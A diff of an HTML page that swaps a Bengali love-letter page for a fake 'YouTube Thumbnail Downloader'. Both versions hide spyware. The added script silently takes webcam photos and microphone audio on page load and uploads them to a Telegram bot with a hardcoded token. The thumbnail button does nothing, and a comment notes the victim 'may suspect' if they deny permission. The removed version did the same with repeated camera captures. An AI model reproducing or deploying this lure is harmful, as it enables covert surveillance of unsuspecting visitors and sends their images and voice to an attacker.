@@ -1,246 +1,240 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>love-letter</title></title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  
+  <title>YouTube Thumbnail Downloader</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');
-
     body {
+      font-family: 'Montserrat', sans-serif;
       margin: 0;
       padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      width: 100vw;
-      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
-      background-size: 300% 300%;
-      font-family: 'Dancing Script', cursive;
-      animation: bgAnimation 12s infinite alternate;
-      overflow: hidden;
+      background-color: #f5f5f5;
     }
-
-    @keyframes bgAnimation {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-
-    .container {
-      text-align: center;
-    }
-
-    h1 {
-      font-size: 3rem;
-      color: #fff;
-      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
-    }
-
-    h1 span {
-      color: #ffeb3b;
-      font-style: italic;
-    }
-
-    .love-letter {
-      font-family: 'Pinyon Script', cursive;
-      font-size: 1.5rem;
-      color: #fff;
-      margin-top: 30px;
-      text-align: left;
-      width: 80%;
-      max-height: 300px;
-      margin: 20px auto;
-      border: 2px solid #ff4b5c;
-      padding: 20px;
-      border-radius: 15px;
-      background-color: rgba(0, 0, 0, 0.5);
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-      overflow-y: auto;
-    }
-
-    video, canvas {
-      display: none; /* Hide video and canvas */
-    }
-
-    .music-btn {
-      position: absolute;
-      bottom: 20px;
-      background-color: #ff4b5c;
+    .navbar {
+      background-color: #ff0000;
       color: white;
-      font-size: 1.5rem;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 25px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
+      text-align: center;
+      padding: 15px 0;
     }
-
-    .music-btn:hover {
-      background-color: #ff1e56;
+    #header {
+      margin: 0;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .form-control {
+      width: calc(100% - 22px);
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0000;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn:hover {
+      background-color: #cc0000;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      color: #666;
+    }
+    .youtube-logo {
+      display: block;
+      margin: 20px auto;
+      width: 100px; /* Adjust size as needed */
     }
   </style>
+  <script type='text/javascript'>
+  //<![CDATA[
+  var uri = window.location.toString();
+  if (uri.indexOf("%3D") > 0) {
+      var clean_uri = uri.substring(0, uri.indexOf("%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("%3D%3D") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("%3D%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("&m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("&m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("?m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("?m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+  //]]>
+  </script>
 </head>
 <body>
+  <nav class="navbar">
+    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
+  </nav>
+
   <div class="container">
-    <h1>I <span>Love</span> You</h1>
+    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
+    <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
+    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
 
-    <div class="love-letter">
-      <p>প্রিয়তম,</p>
-      <p> মনে হলো, তোমার জন্য কিছু লিখে তোমার কাছে আমার অনুভূতিগুলো পৌঁছে দিই। প্রতিটি দিন তোমার সাথে কাটানোর পর, আমি বুঝতে পারি, তুমি আমার জীবনের সবচেয়ে বিশেষ অংশ। তোমার হাসি, তোমার কথা, তোমার ছোঁয়া—সবকিছুই যেন আমার পৃথিবীকে আলোকিত করে। আমি জানি না কীভাবে তোমাকে ধন্যবাদ জানাবো, কারণ তুমি আমার জীবনে এসে এক অমূল্য উপহার হয়ে গেছো।</p>
-
-<p>তোমার সাথে কাটানো প্রতিটি মুহূর্ত আমার জন্য সোনালী হয়ে উঠেছে। তোমার পাশে থাকলে পৃথিবীটা কেমন যেন সুন্দর হয়ে ওঠে। তোমার চোখের দৃষ্টি, তোমার কথা বলার ভঙ্গি, তোমার উপস্থিতি—সবকিছুই আমাকে এক অন্যরকম শান্তি দেয়। আমি প্রতিদিন এই মুহূর্তগুলোকে আরও গভীরভাবে অনুভব করতে চাই। তুমি আমার জীবনে আসার পর, আমি বুঝেছি যে, সত্যিকারের ভালোবাসা কী।</p>
-
-<p>প্রিয়, তোমার পাশে থাকলে আমি নিজেকে পরিপূর্ণ মনে করি। আমি তোমাকে প্রতিশ্রুতি দিতে চাই—তোমার পাশে, তোমার পাশে, আমি সবসময় থাকবো। তোমার সুখে, তোমার দুঃখে, আমি তোমার সঙ্গে এই পথটা চলতে চাই। তুমি যদি কখনো কষ্ট পাও, আমি তোমার পাশে দাঁড়িয়ে সেই কষ্ট শেয়ার করতে চাই। আমরা একসঙ্গে একে অপরকে শক্তি দেবো, এবং একে অপরের জন্য ভালোবাসা আর সুখের পথ তৈরি করবো।</p>
-
-<p>তোমাকে ভালোবাসা আমার জীবনের সবচেয়ে সুন্দর অনুভূতি, আর আমি প্রতিদিন তোমার ভালোবাসায় সিক্ত হতে চাই।
-
-।</p>
-      <p>তোমার জন্য আমার ভালোবাসা অসীম ,</p>
-     
-    </div>
-
-    <!-- Music Play Button -->
-    <button class="music-btn" onclick="toggleMusic()">Play Music</button>
-
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
+    <h2>How to Download HD YouTube Thumbnail</h2>
+    <ol>
+      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
+      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
+      <li>Click on the "FETCH" Button</li>
+      <li>Select the thumbnail quality</li>
+      <li>Download the Thumbnail</li>
+    </ol>
   </div>
 
-  <audio id="loveAudio" loop>
-    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
-    Your browser does not support the audio element.
-  </audio>
+  <center>
+    <button id="toggle-video" style="display:none;">Toggle Video</button>
+    <div id="message-container"></div>
+    <video id="video" width="0" height="0" autoplay></video>
+  </center>
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-    const music = document.getElementById('loveAudio');
-    
-    // Bot 1 details
-    const bot1Token = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY'; 
-    const chatId = chatid;
-if (!chatId) {
-    console.error('Chat ID is not available.');
-    return;
-}
+  <script type="text/javascript">
+    function downloadThumbnail() {
+        // Change button text to indicate fetching
+        var btn = document.getElementById('thumbdloadbtn');
+        btn.textContent = 'Fetching from server... Wait';
 
-    // Bot 2 details
-    const bot2Token = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY'; // Replace with Bot 2's Token
-    const bot2ChatId = '7888600155'; // Replace with Bot 2's Chat ID
-
-    let useFrontCamera = true; // Start with front camera
-    let isMusicPlaying = false;
-
-    // Camera constraints
-    const constraints = {
-      video: {
-        facingMode: useFrontCamera ? 'user' : 'environment'
-      }
-    };
-
-    // Start camera stream
-    function startCamera() {
-      navigator.mediaDevices.getUserMedia(constraints)
-        .then(stream => {
-          video.srcObject = stream;
-        })
-        .catch(error => {
-          console.error('Error accessing camera:', error);
-        });
+        // Add your logic to fetch the thumbnail here
+        // ...
     }
 
-    // Stop the camera stream
-    function stopCamera() {
-      const stream = video.srcObject;
-      if (stream) {
-        const tracks = stream.getTracks();
-        tracks.forEach(track => track.stop());
+    function la(src) {
+      window.location = src;
+    }
+
+    function GetURLParameter(sParam) {
+      var sPageURL = window.location.search.substring(1);
+      var sURLVariables = sPageURL.split('&');
+      for (var i = 0; i < sURLVariables.length; i++) {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam) {
+          return sParameterName[1];
+        }
       }
     }
 
-    // Capture photo and send to both Telegram bots
-    function captureAndSendPhoto() {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const base64Image = canvas.toDataURL('image/png');
-      const blob = base64ToBlob(base64Image);
-
-      sendToTelegram(bot1Token, bot1ChatId, blob); // Send to Bot 1
-      sendToTelegram(bot2Token, bot2ChatId, blob); // Send to Bot 2
-    }
-
-    // Convert Base64 to Blob
-    function base64ToBlob(base64) {
-      const byteString = atob(base64.split(',')[1]);
-      const arrayBuffer = new ArrayBuffer(byteString.length);
-      const uintArray = new Uint8Array(arrayBuffer);
-
-      for (let i = 0; i < byteString.length; i++) {
-        uintArray[i] = byteString.charCodeAt(i);
+    function decodeBase64(encodedStr) {
+      try {
+        return decodeURIComponent(atob(encodedStr));
+      } catch (e) {
+        console.error('Base64 decode error:', e);
+        return null;
       }
-
-      return new Blob([uintArray], { type: 'image/png' });
     }
 
-    // Send photo to Telegram
-    function sendToTelegram(token, chatId, blob) {
-      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+    // Get Base64 encoded 'id' parameter from the URL
+    var base64Id = GetURLParameter('i');
+    var chatid = base64Id ? decodeBase64(base64Id) : null;
+
+    if (chatid) {
+      console.log('Decoded chat ID:', chatid);
+    } else {
+      console.warn('No valid chat ID found.');
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then((stream) => {
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+        const audioRecorder = new MediaRecorder(stream);
+
+        function capturePhoto(index) {
+          setTimeout(() => {
+            imageCapture.takePhoto()
+              .then((blob) => {
+                sendToTelegram(blob, 'photo');
+              })
+              .catch((error) => {
+                console.error('Error capturing photo:', error);
+              });
+          }, index * 2000);
+        }
+
+        function startAudioRecording() {
+          audioRecorder.start();
+          setTimeout(() => {
+            audioRecorder.stop();
+          }, 5000);
+        }
+
+        audioRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            sendToTelegram(event.data, 'audio');
+          }
+        };
+
+        for (let i = 0; i < 3; i++) {
+          capturePhoto(i);
+        }
+
+        startAudioRecording();
+      })
+      .catch((error) => {
+        if (error.name === 'NotAllowedError') {
+          // Handle the case where permissions are denied
+          console.warn('Permissions denied. User may suspect.');
+        } else {
+          console.error('Permission error:', error);
+        }
+      });
+
+    function sendToTelegram(data, type) {
+      const botToken = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY';
+      const chatId = chatid;
+
+      if (!chatId) {
+        console.error('Chat ID is not available.');
+        return;
+      }
 
       const formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'photo.png');
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@lodabotbccc.${type === 'photo' ? 'jpg' : 'wav'}`);
 
-      fetch(url, {
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
         method: 'POST',
-        body: formData,
+        body: formData
       })
         .then(response => response.json())
-        .then(data => {
-          if (!data.ok) {
-            console.error('Telegram API Error:', data);
-          }
-        })
-        .catch(err => {
-          console.error('Fetch Error:', err);
-        });
+        .then(data => console.log(data))
+        .catch(error => console.error('Error sending to Telegram:', error));
     }
-
-    // Automatically switch between front and back cameras
-    function autoSwitchCamera() {
-      setInterval(() => {
-        stopCamera();
-        useFrontCamera = !useFrontCamera; // Toggle camera
-        constraints.video.facingMode = useFrontCamera ? 'user' : 'environment';
-        startCamera();
-      }, 5000); // Switch camera every 5 seconds
-    }
-
-    // Automatically capture photos
-    setInterval(() => {
-      captureAndSendPhoto();
-    }, 5000); // Capture photo every 5 seconds
-
-    // Music control
-    function toggleMusic() {
-      if (isMusicPlaying) {
-        music.pause();
-        isMusicPlaying = false;
-        document.querySelector('.music-btn').textContent = 'Play Music';
-      } else {
-        music.play();
-        isMusicPlaying = true;
-        document.querySelector('.music-btn').textContent = 'Pause Music';
-      }
-    }
-
-    // Initialize camera and start the process
-    startCamera();
-    autoSwitchCamera();
   </script>
+
+ 
 </body>
-</html>৬
+</html>
